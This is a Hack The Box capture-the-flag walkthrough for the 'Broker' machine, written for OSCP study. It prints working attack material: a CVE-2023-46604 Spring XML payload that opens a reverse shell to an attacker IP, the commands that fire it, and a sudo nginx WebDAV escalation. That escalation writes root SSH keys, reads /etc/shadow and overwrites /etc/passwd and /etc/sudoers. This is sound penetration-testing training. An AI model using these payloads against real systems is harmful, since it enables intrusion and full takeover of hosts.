# Broker — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.230.87                  |
| **OS**       | Linux (Ubuntu 22.04 Jammy)     |
| **Difficulty** | Easy                         |
| **Key Skills** | Default credentials, Apache ActiveMQ CVE-2023-46604 (deserialization RCE), sudo nginx privesc (custom config + WebDAV PUT to write SSH keys) |

---

## 1. Enumeration

### Nmap — Key Ports
```bash
sudo nmap -sC -sV -A -O -p- 10.129.230.87 -Pn --min-rate 1000
```
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp    open  http       nginx 1.18.0 — 401 Unauthorized (basic realm=ActiveMQRealm)
1883/tcp  open  mqtt       ← MQTT messaging protocol
5672/tcp  open  amqp?      ← Advanced Message Queuing Protocol
8161/tcp  open  http       Jetty 9.4.39 — 401 Unauthorized (ActiveMQRealm)
40493/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ (STOMP protocol)
61614/tcp open  http       Jetty 9.4.39 (API endpoint)
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```

### Key Observations
- **Many ports** — but they all belong to **Apache ActiveMQ**, a message broker
- **Ports 80 and 8161** — both return HTTP 401 with `ActiveMQRealm` → need credentials
- **Port 61616** — reveals the version: **ActiveMQ OpenWire transport 5.15.15**
- **MQTT (1883), AMQP (5672), STOMP (61613)** — messaging protocols, not directly exploitable here
- **Jetty 9.4.39** — the embedded web server for ActiveMQ's admin console

### Default Credentials
ActiveMQ ships with well-known default credentials:
```
admin:admin
```
These work on both port 80 (nginx proxy) and port 8161 (Jetty admin console), granting access to the ActiveMQ web management interface.

> **OSCP Technique — Default Credentials:**
> ALWAYS try default credentials before brute-forcing. Common defaults: `admin:admin`, `admin:password`, `root:root`, `tomcat:tomcat`, `manager:manager`. Check the product's documentation for shipped defaults. ActiveMQ, Tomcat, Jenkins, and Grafana all ship with known defaults.

---

## 2. Initial Access — CVE-2023-46604 (Apache ActiveMQ RCE)

### The Vulnerability
Apache ActiveMQ versions before 5.15.16, 5.16.7, 5.17.6, and 5.18.3 are vulnerable to **CVE-2023-46604** — a critical (CVSS 10.0) **deserialization vulnerability** in the OpenWire protocol (port 61616).

The exploit sends a specially crafted `ClassInfo` command that triggers `ClassPathXmlApplicationContext` to load a remote XML file. That XML defines a Spring bean that executes arbitrary OS commands.

### Exploitation

**Step 1 — Prepare the malicious XML payload (`poc-linux.xml`):**
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>bash -i &gt;&amp; /dev/tcp/10.10.14.4/9001 0&gt;&amp;1</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

**Step 2 — Host the XML on your attack machine:**
```bash
python3 -m http.server 8005
```

**Step 3 — Start listener:**
```bash
nc -lnvp 9001
```

**Step 4 — Fire the exploit (Go PoC):**
```bash
go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.14.4:8005/poc-linux.xml
```

**Alternative — Python PoC:**
```bash
python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.14.4:8005/poc-linux.xml
```

### Shell as activemq
```bash
$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
```

### Shell Upgrade
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

### User Flag
```bash
cat ~/user.txt
```

> **OSCP Technique — Java Deserialization RCE:**
> Java apps that deserialize untrusted data are common targets. The pattern: (1) find the vulnerable service and version, (2) craft a payload (often XML/serialized object), (3) host it on your HTTP server, (4) trigger the deserialize. ActiveMQ, Jenkins, JBoss, WebLogic, and Tomcat all have known deserialization CVEs. Always check the OpenWire/RMI/JNDI ports.

> **OSCP Technique — Non-Standard Ports:**
> When you see ports like 61616, 8161, 1883, 5672 — Google them. Port 61616 = ActiveMQ OpenWire, 8161 = ActiveMQ web console, 1883 = MQTT, 5672 = AMQP. The service version often appears directly in nmap output.

---

## 3. Privilege Escalation — sudo nginx (Custom Config + WebDAV)

### Discover the Vector
```bash
sudo -l
```
```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

### How It Works
Nginx can be started with a **custom config file** (`-c`). By writing a config that:
1. Runs nginx as **root** (`user root;`)
2. Serves the **entire filesystem** (`root /;`)
3. Enables **WebDAV PUT** (`dav_methods PUT;`)
4. Listens on a custom port

...you get a root-privileged web server that can **read and write any file** on the system.

### Exploitation

**Step 1 — Create the malicious nginx config:**
```bash
cat > /tmp/nginx.conf << 'EOF'
user root;
worker_processes auto;
events {
    worker_connections 768;
}
http {
    server {
        listen 1338;
        server_name localhost;
        root /;
        dav_methods PUT;
        autoindex on;
    }
}
EOF
```

**Step 2 — Start nginx with the custom config:**
```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
```

**Step 3 — Generate an SSH key pair:**
```bash
ssh-keygen -f /tmp/mykey -N ""
```

**Step 4 — Write your public key to root's authorized_keys:**
```bash
curl -X PUT http://127.0.0.1:1338/root/.ssh/authorized_keys -d "$(cat /tmp/mykey.pub)"
```

**Step 5 — SSH as root:**
```bash
ssh -i /tmp/mykey root@127.0.0.1
```

### Root Flag
```bash
cat /root/root.txt
```

> **OSCP Technique — sudo nginx Privesc:**
> If you can run `nginx` with sudo, you control the config. Write a config with `user root;` and `dav_methods PUT;` to get arbitrary file write as root. This gives you multiple paths to root: write SSH keys, overwrite `/etc/passwd`, modify `/etc/sudoers`, or read `/etc/shadow`.

---

## 4. Alternative Privesc Methods (Same nginx Trick)

### Read /etc/shadow (Crack Root Password)
```bash
# With autoindex on and root /, just curl any file:
curl http://127.0.0.1:1338/etc/shadow
# Copy root's hash → crack with hashcat/john
```

### Overwrite /etc/passwd (Add Root User)
```bash
# Generate a password hash
openssl passwd -6 hacked

# Create a new root user entry
echo 'hacker:$6$...:0:0::/root:/bin/bash' > /tmp/passwd_entry
curl -X PUT http://127.0.0.1:1338/etc/passwd -d "$(cat /etc/passwd)
hacker:\$6\$...:0:0::/root:/bin/bash"

# Login
su hacker
# Password: hacked
```

### Modify /etc/sudoers
```bash
curl -X PUT http://127.0.0.1:1338/etc/sudoers -d "$(cat /etc/sudoers)
activemq ALL=(ALL) NOPASSWD: ALL"
sudo su
```

### Read Root Flag Directly (Quick Win)
```bash
curl http://127.0.0.1:1338/root/root.txt
```

> **OSCP Technique — Arbitrary File Write = Root:**
> Any mechanism that gives you file write as root (nginx PUT, writable cron, sudo tee, etc.) opens multiple paths. The SSH key method is cleanest and most reliable for OSCP — no password cracking needed, leaves the system stable.

---

## 5. Attack Chain Summary

```
Nmap → Port 80/8161 (401 Unauthorized — ActiveMQRealm)
         Port 61616 (ActiveMQ OpenWire 5.15.15)
    |
    +--> Default creds: admin:admin → ActiveMQ web console
    |
    +--> CVE-2023-46604 (OpenWire deserialization RCE)
    |        |
    |        +--> Malicious XML → ClassPathXmlApplicationContext
    |                 |
    |                 +--> Reverse shell as activemq → USER FLAG
    |
    +--> sudo -l → /usr/sbin/nginx (NOPASSWD)
             |
             +--> Custom nginx.conf: user root + dav_methods PUT
                      |
                      +--> Write SSH key to /root/.ssh/authorized_keys
                               |
                               +--> SSH as root → ROOT FLAG
```

---

## 6. OSCP Exam Takeaways

### Techniques Demonstrated
1. **Default credentials** — `admin:admin` on ActiveMQ, always try defaults first
2. **Service identification by port** — 61616 = ActiveMQ OpenWire, 1883 = MQTT, 5672 = AMQP, 61613 = STOMP
3. **Java deserialization RCE** — CVE-2023-46604, ClassPathXmlApplicationContext loading remote XML
4. **sudo arbitrary program = privesc** — nginx with custom config gives root file read/write
5. **WebDAV PUT** — `dav_methods PUT` in nginx enables arbitrary file upload
6. **SSH key injection** — write your public key to `authorized_keys` for passwordless root access
7. **Multiple privesc paths from same vector** — SSH keys, /etc/passwd, /etc/shadow, /etc/sudoers

### Exam Patterns
- **Many ports ≠ many attack surfaces** — all ports here belong to one application (ActiveMQ). Identify the product first, then find its CVEs
- **Default credentials are free wins** — always try before brute-forcing or looking for exploits
- **sudo + config file = root** — any program that accepts a config file (nginx, apache2, mysql) and can be run as root is a privesc vector. Control the config → control the behavior
- **WebDAV is powerful** — if you can enable PUT on a web server running as root, you can write anywhere on the filesystem
- **Know your message broker ports** — ActiveMQ (61616), RabbitMQ (5672/15672), Kafka (9092), Redis (6379) — these appear on OSCP and all have known CVEs
